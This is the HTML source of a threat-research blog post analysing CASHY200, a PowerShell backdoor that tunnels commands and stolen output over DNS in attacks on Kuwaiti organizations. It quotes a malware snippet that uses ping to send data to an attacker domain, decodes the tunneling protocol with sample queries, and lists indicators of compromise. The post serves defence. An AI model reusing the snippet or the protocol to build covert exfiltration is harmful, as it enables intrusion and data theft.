
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>xHunt Campaign: New PowerShell Backdoor Blocked Through DNS Tunnel Detection</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="During our continued analysis of the xHunt campaign, we observed several domains with ties to the pasta58[.]com domain associated with known Sakabota command and control (C2) activity. In June 2019, we observed one of these overlapping domains, specifically, windows64x[.]com, being used as the C2 server for a new PowerShell based backdoor that we’ve named CASHY200. This PowerShell backdoor used DNS tunneling to communicate with its C2 server, specifically by issuing DNS A queries to the actor controlled name server at the aforementioned domain. CASHY200 parses data provided by the C2 server within DNS answers to run commands on the system and send the results back to the C2 via DNS queries. In several samples, CASHY200 used randomly generated identifiers that are stored in the registry at HKCUSoftwareMicrosoftCasheindex and used the command value 200 to communicate with the C2 server. These details are the basis for the name CASHY200."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="xHunt Campaign: New PowerShell Backdoor Blocked Through DNS Tunnel Detection" />
<meta property="og:description" content="During our continued analysis of the xHunt campaign, we observed several domains with ties to the pasta58[.]com domain associated with known Sakabota command and control (C2) activity. In June 2019, we observed one of these overlapping domains, specifically, windows64x[.]com, being used as the C2 server for a new PowerShell based backdoor that we’ve named CASHY200. This PowerShell backdoor used DNS tunneling to communicate with its C2 server, specifically by issuing DNS A queries to the actor controlled name server at the aforementioned domain. CASHY200 parses data provided by the C2 server within DNS answers to run commands on the system and send the results back to the C2 via DNS queries. In several samples, CASHY200 used randomly generated identifiers that are stored in the registry at HKCU\Software\Microsoft\Cashe\index and used the command value 200 to communicate with the C2 server. These details are the basis for the name CASHY200." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="CASHY200" />
<meta property="article:tag" content="DNS security" />
<meta property="article:tag" content="dns tunneling" />
<meta property="article:tag" content="malware" />
<meta property="article:tag" content="xHunt" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2019-10-10T12:00:21+00:00" />
<meta property="article:modified_time" content="2020-01-24T20:43:59+00:00" />
<meta property="og:updated_time" content="2020-01-24T20:43:59+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-768x384.png" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-768x384.png" />
<meta property="og:image:width" content="768" />
<meta property="og:image:height" content="384" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="During our continued analysis of the xHunt campaign, we observed several domains with ties to the pasta58[.]com domain associated with known Sakabota command and control (C2) activity. In June 2019, we observed one of these overlapping domains, specifically, windows64x[.]com, being used as the C2 server for a new PowerShell based backdoor that we’ve named CASHY200. This PowerShell backdoor used DNS tunneling to communicate with its C2 server, specifically by issuing DNS A queries to the actor controlled name server at the aforementioned domain. CASHY200 parses data provided by the C2 server within DNS answers to run commands on the system and send the results back to the C2 via DNS queries. In several samples, CASHY200 used randomly generated identifiers that are stored in the registry at HKCU\Software\Microsoft\Cashe\index and used the command value 200 to communicate with the C2 server. These details are the basis for the name CASHY200." />
<meta name="twitter:title" content="xHunt Campaign: New PowerShell Backdoor Blocked Through DNS Tunnel Detection" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-768x384.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; xHunt Campaign: New PowerShell Backdoor Blocked Through DNS Tunnel Detection Comments Feed" href="https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/feed/" />
<meta property="og:likes" content="12"/>
<meta property="og:readtime" content="11"/>
<meta property="og:views" content="28,343"/>
<meta property="og:date_created" content="October 10, 2019 at 5:00 AM"/>
<meta property="og:post_length" content="3433"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:author" content="Brittany Barbehenn"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/brittany-ash/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-1-380x184.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"xHunt Campaign: New PowerShell Backdoor Blocked Through DNS Tunnel Detection","name":"xHunt Campaign: New PowerShell Backdoor Blocked Through DNS Tunnel Detection","description":"During our continued analysis of the xHunt campaign, we observed several domains with ties to the pasta58[.]com domain associated with known Sakabota command and control (C2) activity. In June 2019, we observed one of these overlapping domains, specifically, windows64x[.]com, being used as the C2 server for a new PowerShell based backdoor that we\u2019ve named CASHY200. This PowerShell backdoor used DNS tunneling to communicate with its C2 server, specifically by issuing DNS A queries to the actor controlled name server at the aforementioned domain. CASHY200 parses data provided by the C2 server within DNS answers to run commands on the system and send the results back to the C2 via DNS queries. In several samples, CASHY200 used randomly generated identifiers that are stored in the registry at HKCU\\Software\\Microsoft\\Cashe\\index and used the command value 200 to communicate with the C2 server. These details are the basis for the name CASHY200.","url":"https:\/\/unit42.paloaltonetworks.com\/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection\/","datePublished":"October 10, 2019","articleBody":"Executive Summary\r\nDuring our continued analysis of the xHunt campaign, we observed several domains with ties to the pasta58[.]com domain associated with known Sakabota command and control (C2) activity. In June 2019, we observed one of these overlapping domains, specifically, windows64x[.]com, being used as the C2 server for a new PowerShell based backdoor that we\u2019ve named CASHY200. This PowerShell backdoor used DNS tunneling to communicate with its C2 server, specifically by issuing DNS A queries to the actor controlled name server at the aforementioned domain. CASHY200 parses data provided by the C2 server within DNS answers to run commands on the system and send the results back to the C2 via DNS queries. In several samples, CASHY200 used randomly generated identifiers that are stored in the registry at HKCU\\Software\\Microsoft\\Cashe\\index and used the command value 200 to communicate with the C2 server. These details are the basis for the name CASHY200.\r\n\r\nWhile we do not have telemetry showing how the CASHY200 PowerShell backdoor was delivered, in September 2019 we observed a host based in Kuwait beaconing to the windows64x[.]com domain using the same DNS tunneling protocol as the CASHY200 payload. Fortunately, the beaconing to this domain was blocked by our DNS security service, so the adversary was no longer able to communicate with their payload using this DNS tunnel. By analyzing the lineage of this tool, we found that actors may have used CASHY200 when targeting Kuwaiti government organizations starting in the spring of 2018 and continuing throughout 2019, according to our open source collection efforts.\r\nCASHY200 Attacks\r\nOn September 16, 2019, an organization based in Kuwait enabled our DNS Security subscription, which detected malicious DNS tunneling activity within minutes. The DNS tunnel was communicating with the windows64x[.]com domain, which we had previously linked to the xHunt campaign that targeted shipping and transportation organizations in Kuwait. By blocking the DNS tunnel, the actor no longer had the ability to access the compromised systems. We do not have any telemetry on the initial breach that resulted in the installation of the payload using the DNS tunnel.\r\n\r\nWhile investigating the activity, we found a CASHY200 PowerShell-based payload that communicated with windows64x[.]com. We analyzed this PowerShell script and found that its DNS tunneling protocol matched the outbound DNS requests at the Kuwaiti organization which were blocked by DNS Security. We will provide an analysis of CASHY200 and its DNS tunneling protocol in a later section of this blog.\r\n\r\nAfter gathering additional CASHY200 samples, we observed evidence that the threat group was actively developing this PowerShell-based tool for use in their attack campaigns. While researching this evolution, we found several samples that date back to May and June of 2018. On May 1 and June 3, 2018, we first saw executables that installed and executed CASHY200 PowerShell scripts that communicated with the domains windows-updates[.]com and firewallsupports[.]com, respectively. We do not have telemetry to determine the organizations that were impacted by these payloads, however, the Tweets by @Voulnet seen in Figure 1 suggest that Word documents were used to deliver PowerShell payloads using firewallsupports[.]com as a C2 to target government organizations in Kuwait.\r\n\r\n\r\nFigure 1. Tweet by @Voulnet suggesting that PowerShell-based payloads communicating with firewallsupports[.]com were used to target the Kuwaiti government\r\nWhile we are unable to confirm that this threat group used CASHY200 payloads configured to communicate with firewallsupports[.]com to target government organizations in Kuwait, we did discover Word documents that installed CASHY200 payloads configured with the aforementioned domain as its C2 which also contained the logo of a Kuwaiti government organization as part of its social engineering lure image. This aligns with the general targeting observed in the xHunt campaign, in which the attacks were solely on Kuwaiti organizations. Table 1 lists the Word documents seen installing CASHY200, which shows another C2 domain, winx64-microsoft[.]com, used by this threat group.\r\n\r\n\r\n\r\nModified time\r\nSHA256\r\nFilename\r\nC2 domain\r\n\r\n\r\n8\/20\/2018 7:00:00\r\nbce37fc0...\r\n\u0639\u064a\u062f \u0627\u0644\u0623\u0636\u062d\u0649.docm\r\nfirewallsupports[.]com\r\n\r\n\r\n8\/13\/2018 9:07:00\r\n5a3c156...\r\n\u062f\u0644\u06cc\u0644 \u062a\u0633\u062c\u06cc\u0644 \u0627\u0644\u062f\u062e\u0648\u0644.docm\r\nfirewallsupports[.]com\r\n\r\n\r\n1\/1\/1980 0:00:00\r\n45b2db5...\r\nUpdate list soft-Ad.docm\r\nwinx64-microsoft[.]com\r\n\r\n\r\n7\/4\/2018 5:45:00\r\nce6b44af...\r\n\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0646\u0645\u0627\u0630\u062c \u0627\u0644\u0639\u0627\u0645\u062901.docm\r\nfirewallsupports[.]com\r\n\r\n\r\n7\/4\/2018 6:10:00\r\n0b54763...\r\n\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0646\u0645\u0627\u0630\u062c \u0627\u0644\u0639\u0627\u0645\u062902.docm\r\nfirewallsupports[.]com\r\n\r\n\r\n7\/4\/2018 6:09:00\r\n396235b...\r\n\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0646\u0645\u0627\u0630\u062c \u0627\u0644\u0639\u0627\u0645\u062903.docm\r\nfirewallsupports[.]com\r\n\r\n\r\n\r\nTable 1. Malicious Word documents installing CASHY200 payloads\r\nAlso of interest, on May 14, 2019, an individual posted on Microsoft\u2019s TechNet forum requesting information on an activity they observed on two of their servers that involved the domain windows64x[.]com. The activity described by the individual is tunneling activity to the same C2 domain using the same DNS tunneling protocol that we blocked at the Kuwaiti government organization. While we cannot confirm the organization experiencing this activity, based on the details provided in the forum post, we believe that the individual also worked at another Kuwaiti government organization.\r\n\r\nAnother interesting detail provided in the post to TechNet was that the queries for the DNS tunnel were generated using the command ping -n 1 &lt;domain&gt;. We observed the same technique to issue queries for a DNS Tunnel in a CASHY200 sample configured with firewallsupports[.]com as the C2, as depicted in the code in Figure 2. If a user (or malicious script in this case) provides a domain to the ping command, the application will attempt to resolve the domain before sending the ICMP messages to ping the remote system. Using the ping application in this manner effectively sends the query for the DNS tunnel.\r\n$domain = $rnd + $in + $id + $coun + $data + \r\n'.firewallsupports[.]com'\r\n$get = cmd \/c ping -n 1 $domain\r\nFigure 2. Code in CASHY200 sample using ping -n 1 to issue DNS queries to firewallsupports[.]com\r\nSimilarly, we observed another CASHY200 sample that used the nslookup command in the same manner as the ping sample except to communicate using the domain windows64x[.]com. This sample used nslookup -type=a &lt;domain&gt; to issue the DNS queries and further strengthens the relationship between the two domains.\r\nCASHY200 DNS Tunneling Protocol\r\nWe analyzed the file(SHA256: eccc65711cbd154f680e8c8ef343d53f29e4a6237510abd4ad1eab5742b035b3) in order to understand the capabilities of the payload and the DNS tunneling protocol that was blocked at the Kuwaiti organization. This sample communicates with the domain windows64x[.]com. The DNS tunneling protocol relies on DNS A queries to send data from the Trojan to the C2 server within the subdomain of the queried domain and receive data within the IPv4 answer from the C2 server. At a high level, the CASHY200 sample associated with this activity can issue two different commands, seen in Table 2 by answering the initial beacon query with an IPv4 answer that has either 48 or 92 as its first octet.\r\n\r\n\r\n\r\nCommand in IPv4\r\nDescription of Command\r\n\r\n\r\n48.x.x.x\r\nRun \u2018hostname\u2019 command and send the results to the C2 over DNS tunnel.\r\n\r\n\r\n92.&lt;# of queries&gt;.x.x\r\nObtain command to run from the answers to subsequent DNS queries and send the results to the C2 over DNS tunnel. Second octet is used to notify the payload how many DNS queries to issue to obtain the command\r\n\r\n\r\n\r\nTable 2. Commands available within CASHY200 and their functionality\r\nOlder samples of CASHY200 that used windows-updates[.]com and firewallsupports[.]com for their C2 domains only had one command available that it would issue by including 200 as its first octet of the IPv4 answer. This command had the same functionality as the 92 command seen in Table 2 above. In these older samples, the 48 command was not needed as they would provide the hostname of the system within the initial beacon instead of requesting it from the C2. The command value of 200 is the basis for the latter part of the CASHY200 name.\r\n\r\nIn general, the domains generated by CASHY200 for its DNS tunnel will be structured as seen in Figure 3. The sequence number and data for exfiltration fields are optional and are often blank depending on the Trojan's request type. For instance, the first DNS query that acts as a beacon does not have a sequence number or data exfiltration field. In addition, older samples of CASHY200 use 4 random characters instead of 5.\r\n&lt;5 random characters&gt;&lt;hexlified request type&gt;&lt;hexlified unique\r\nhostname&gt;&lt;sequence number&gt;&lt;data for\r\nexfiltration&gt;.windows64x[.]com\r\n\u00a0 \u00a0Figure 3. Structure of the DNS queries generated by CASHY200 for its DNS tunneling protocol\r\n\r\nThe request type field allows CASHY200 to tell the C2 server the purpose of the DNS query it issued. This allows the C2 server to respond to the inbound query with the appropriate IPv4 address within the DNS answer. Table 3 provides all of the available request types and the purpose of the DNS query. It is important to note that CASHY200 samples using windows64x[.]com as a C2 server can receive commands within the response to both the d or the q request types, whereas older samples can only process commands from responses to the q request type.\r\n\r\n\r\n\r\nRequest type\r\nDescription\r\n\r\n\r\nd\r\nInitial \u2018hello\u2019 beacon.\r\n\r\n\r\nq\r\nRequesting command beacon.\r\n\r\n\r\nf\r\nFinished sending results.\r\n\r\n\r\nc\r\nSending number of upcoming queries to send the custom command results.\r\n\r\n\r\nh\r\nObtaining data from C2 within IPv4 answers.\r\n\r\n\r\na\r\nSending hostname command results within subdomain.\r\n\r\n\r\nr\r\nSending custom command results within subdomain.\r\n\r\n\r\n\r\nTable 3. Request types that CASHY200 will use to notify C2 of the purpose of each DNS query\r\nIn the CASHY200 tunnel that was blocked by DNS Security, the &lt;hexlified unique hostname&gt; was a string hardcoded by the actor into the Trojan, which appears unique to the infected system. This hardcoded hostname suggested that the threat actor created the CASHY200 sample specifically for the compromised host, which also allowed us to quickly determine the infected hosts to triage remediation efforts. Older samples of CASHY200 use randomly generated identifiers that the Trojan stores in the registry, one location was HKCU\\Software\\Microsoft\\Cashe\\index, which was the basis of the front portion of the name CASHY200.\r\n\r\nAs previously mentioned, the sequence number only appears within the queried subdomain when CASHY200 sends data to the C2 server. CASHY200 will start the sequence number at 101 and increment this value each query it sends until it has transmitted all of the data to the C2.\r\nCASHY200 DNS Tunnel Example\r\nTo understand and visualize the DNS tunneling protocol used by CASHY200, we created a C2 server to interact with and issue commands to the backdoor. We created the C2 server to interact with the CASHY200 sample configured with windows64x[.]com which can process two commands: 48 or 92 within the first octet of the DNS A record answer (see Table 2 for command description). Figure 4 below shows a network packet capture of CASHY200 interacting with our C2 server. This image shows CASHY200 receiving the \u2018hostname\u2019 command followed by a custom command of \u2018whoami\u2019, both of which the backdoor will run and transmit the results back to the C2.\r\n\r\nOf note, Figure 4 shows the DNS server responding to these queries with 1.2.3.4, which is just a placeholder we included in our C2 server as CASHY200 ignores the DNS response when sending data.\r\nFigure 4. DNS traffic associated with CASHY200 receiving and responding to the \u2018hostname\u2019 followed by a custom command \u2018whoami\u2019\r\nIn Figure 4, the first DNS query to resolve is\r\nyFIOr645245444143544544.windows64x[.]com which acts as an initial beacon. The first five characters (yFIOr) are random and have no purpose other than generating random subdomains in order to avoid DNS caching. The next two characters (64) signify the Hex notation of the d request type, which is the request type for the initial beacon as noted in Table 3. The request type is followed by the system specific hostname hardcoded into the sample, which in this case is 5245444143544544 for &lt;REDACTED&gt;.\r\n\r\nTo issue the 48 command to get the hostname of the system, the C2 server responds to the initial beacon query with 48 as the first octet of the IPv4 answer, specifically 48.0.0.0. The C2 server does not have to issue this IPv4 specifically to issue the \u2018hostname\u2019 command, as CASHY200 ignores the remaining three octets and runs the 'hostname' command. Our test system had a hostname of test-system-ftw, which CASHY200 sends to the C2 server in a sequence of DNS queries to resolve the following:\r\n\r\n \tpevtF6152454441435445443130316447567a6443317a65584e305a57303d.windows64x[.]com\r\n \tdiosk6152454441435445443130324c575a3064773d3d.windows64x[.]com\r\n \tweDlz615245444143544544313033.windows64x[.]com\r\n \t\r\n\r\nThese DNS queries contain the results of the \u2018hostname\u2019 command using the request type a (61) in the subdomain of the three queries) in order to transmit the data. Following the request type is the data to be sent within these DNS queries. The C2 server uses sequence numbers to put the queries in the correct order before base64 decoding the data in each query. In our example, the data, which converted from hexadecimal notation results in 101dGVzdC1zeXN0ZW0=, 102LWZ0dw== and 103. The C2 server then concatenates the decoded data from each query to create the results. Table 4 shows how the C2 would process the \u2018hostname\u2019 command results sent by CASHY200 to produce test-system-ftw.\r\n\r\n\r\n\r\nSequence Number\r\nEncoded Data\r\nDecoded Data\r\n\r\n\r\n101\r\ndGVzdC1zeXN0ZW0=\r\ntest-system\r\n\r\n\r\n102\r\nLWZ0dw==\r\n-ftw\r\n\r\n\r\n103\r\n&lt;no data&gt;\r\n\r\n\r\n\r\n\r\nTable 4. Our C2 processing data sent by CASHY200 in response to the \u2018hostname\u2019 command\r\nAfter sending the results of the \u2018hostname\u2019 command, CASHY200 issues the UDmEJ665245444143544544.windows64x[.]com DNS query with the request type f (66 in the subdomain) to notify the C2 it is done sending data. After sending the results of the \u2018hostname\u2019 command, CASHY200 issues a query to resolve GmhpF715245444143544544.windows64x[.]com with a request type of q (71 in the subdomain). CASHY200 issues this request to obtain a custom command from the C2 server to run in command prompt.\r\n\r\nThe packet capture in Figure 4 shows our C2 server responding to the CASHY200 query with a request type of q and IPv4 address of 92.2.0.0. As mentioned in Table 2, CASHY200 will parse this IPv4 as a custom command with the first octet of the IPv4 (92) signaling the issued custom command and the second octet (2) as the number of DNS queries the backdoor must issue to download the entire command from the C2 server\u2019s answers to queries. The command data is issued via IPv4 addresses within the DNS answers, which is a very inefficient way of transmitting data as the C2 can only send four bytes of data for each DNS query the Trojan issues.\r\n\r\nBased on the answer 92.2.0.0, CASHY200 issues the following two DNS queries, both of which have a request type of h (68 in the subdomains) and sequence numbers of 100 and 101 (313030 and 313031 in the subdomains):\r\n\r\n \tiQKEe685245444143544544313030.windows64x[.]com\r\n \tTyxLC685245444143544544313031.windows64x[.]com\r\n \t\r\n\r\nThe C2 server answers these two queries with the IPv4 addresses 119.104.111.97 and 109.105.0.0, which CASHY200 processes by treating each octet as a byte of data and concatenating all the bytes to receive the command. For instance, Table 5 shows how CASHY200 would process the two IPv4 answers to obtain the command \u2018whoami\u2019.\r\n\r\n\r\n\r\nIPv4 Answer\r\nOctets in Ascii\r\nResulting string\r\n\r\n\r\n119.104.111.97\r\n\u2018w\u2019.\u2019h\u2019.\u2019o\u2019.\u2019a\u2019\r\nwhoa\r\n\r\n\r\n109.105.0.0\r\n\u2018m\u2019.\u2019i\u2019.\u2019\\x00\u2019.\u2019\\x00\u2019\r\nmi\r\n\r\n\r\n\r\nTable 5. CASHY200 processing IPv4 answers from our C2 to get a custom command to run \u2018whoami\u2019 \r\nAfter running the custom command \u2018whoami\u2019, CASHY200 sends the results to the C2 server in a slightly different manner than how it sends the results of the \u2018hostname\u2019 command discussed earlier. CASHY200 begins sending the results of the custom command by issuing a query to resolve YqpZf6352454441435445443.windows64x[.]com, which contains a request type of c (63 in the subdomain) and the number 3 as the data field. CASHY200 uses the number in the data field of this request to notify the C2 how many queries it will send to transmit the results of the custom command.\r\n\r\nAfter sending the count of queries required to transmit the results, CASHY200 issues the following three queries, all of which have a request type of r (72 in the subdomains):\r\n\r\n \tQMNnv7252454441435445443130316447567a6443317a65584e305a57303d.windows64x[.]com\r\n \tOlBCh7252454441435445443130324c575a30643178305a584e304c513d3d.windows64x[.]com\r\n \tXUkra72524544414354454431303364584e6c63673d3d.windows64x[.]com\r\n \t\r\n\r\nThe three queries used to send the results of the custom command include a sequence number starting at 101 that increments each query followed by data, all of which is represented as hexadecimal bytes. After converting the hexadecimal bytes, the queries contain 101dGVzdC1zeXN0ZW0=, 102LWZ0d1x0ZXN0LQ==, and 103dXNlcg==, which shows the incrementing sequence numbers followed by the base64 encoded results of the custom \u2018whoami\u2019 command, which in our test case was test-system-ftw\\test-user. Table 6 shows how the C2 server will process the three queries issued by CASHY200 to transmit the results of the custom command.\r\n\r\n\r\n\r\nSequence Number\r\nEncoded Data\r\nDecoded Data\r\n\r\n\r\n101\r\ndGVzdC1zeXN0ZW0=\r\ntest-system\r\n\r\n\r\n102\r\nLWZ0d1x0ZXN0LQ==\r\n-ftw\\test-\r\n\r\n\r\n103\r\ndXNlcg==\r\nuser\r\n\r\n\r\n\r\nTable 6. Our C2 processing data sent by CASHY200 in response to the custom command \u2018whoami\u2019 \r\nAfter sending the results of the custom \u2018whoami\u2019 command, CASHY200 issues the DNS query fvSwZ665245444143544544.windows64x[.]com with the request type f (66 in the subdomain) to notify the C2 it is done sending data.\r\nConclusion\r\nAccording to our initial publication, the xHunt Campaign targeted Kuwaiti organizations using several custom tools to compromise systems. We discovered another custom tool that we call CASHY200, which is a PowerShell-based backdoor that communicates with a C2 server using DNS tunneling. We found evidence through open source collection that this threat group used CASHY200 to target Kuwaiti government organizations. While we cannot confirm the specific organizations mentioned in the open source, we can confirm that another Kuwaiti organization was targeted by this group based on our own telemetry from our DNS Security service. These discoveries suggest that this threat group has targeted Kuwaiti organizations since the spring of 2018 through 2019, which includes organizations in both government and shipping and transportation industries.\r\n\r\nPalo Alto Networks customers are protected from the tools mentioned in this blog through the following:\r\n\r\n \t\r\n\r\n \tCustomers using AutoFocus can view this activity by using the xHunt and CASHY200 tags\r\n \tThe DNS tunneling protocols referenced in this blog are detected through DNS Security automated detection.\r\n \tC2 domains windows64x[.]com, firewallsupports[.]com, windows-updates[.]com, and winx64-microsoft[.]com are classified as malicious in Threat Prevention and URL Filtering.\r\n \tAll CASHY200 samples identified are detected as malicious by WildFire and Traps.\r\n \tAll CASHY200 tunneling protocols are blocked by DNS Security.\r\n\r\n\r\n\r\nSpecial thanks to Daiping Liu and Jun Javier Wang for the notification and assistance regarding the DNS Security service blocking this DNS tunneling activity.\r\n\r\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.\r\nIndicators of Compromise\r\nExecutable Droppers\r\nffe2e9b274b00ea967c96eca9c177048c35de75599488f1b8be5ae1cceba00d9\r\n3e13f539071d56106e252566b436933ccffd2d509f0c3fae916748971663946c\r\n1f48eceb9dca085d8eb2bcea1dde28e2643e1b198b0a7e998d7708fa68d43575\r\n79c8ceb3627a8d35c8e7255007d87af8e20f1eb341b5446da1e063cf5da39c6f\r\nWord Delivery Documents\r\nbce37fc0d97ac6bed24098ecf4187081e9a664c87d4fe558f3e46928140c835f\r\n5a3c156565f4243eacf179b95696a15a2e1c460315ff0940c0c71c4f587eb4b3\r\n45b2db5a78758f9d5125897da4a31c67e68424269eeed58646a87326a2b45d80\r\nce6b44af79db56be053f63426acee02c591a2e19ef29f43227ea5b0640e9b24a\r\n0b5476369bca1d9998aa4a53dfe9e958268cd48ac69f9a16001f842330133fe6\r\n396235b998ab348e7f82f1145e8566820652f187c28df2cdeb0dc9b0ef790422\r\nCASHY200 Samples\r\neccc65711cbd154f680e8c8ef343d53f29e4a6237510abd4ad1eab5742b035b3\r\na0ce856d224ee04558e5cb67bda8ae4733dd40f5a8e59ab5a799d7d1378625b4\r\nb62c3aa413cc5bd551836328b9740ddd50c1a8aa7a04ea0e301fa507724e18f6\r\ne36a4056b32e094ff6b0aefb2ffe11f033969dc10fa58199559d8c117d0e1b6f\r\n2b73fe5b9ba44fadcee8657cb2d2b37aab8d0a3be4ed1f437c83f4594e501cd6\r\n788687e478704b324089af011cbe20d9d3a590283dd85e45ffe3e51a340f58ca\r\nffe2e9b274b00ea967c96eca9c177048c35de75599488f1b8be5ae1cceba00d9\r\n3e13f539071d56106e252566b436933ccffd2d509f0c3fae916748971663946c\r\n1f48eceb9dca085d8eb2bcea1dde28e2643e1b198b0a7e998d7708fa68d43575\r\n79c8ceb3627a8d35c8e7255007d87af8e20f1eb341b5446da1e063cf5da39c6f\r\nCASHY200 C2 domains\r\nwindows64x[.]com\r\nwinx64-microsoft[.]com\r\nfirewallsupports[.]com\r\nwindows-updates[.]com","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2019\/07\/Adversary-r3d1-768x384-150x150.png","width":150,"height":150},"author":[{"@type":"Person","name":"Robert Falcone"},{"@type":"Person","name":"Brittany Barbehenn"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
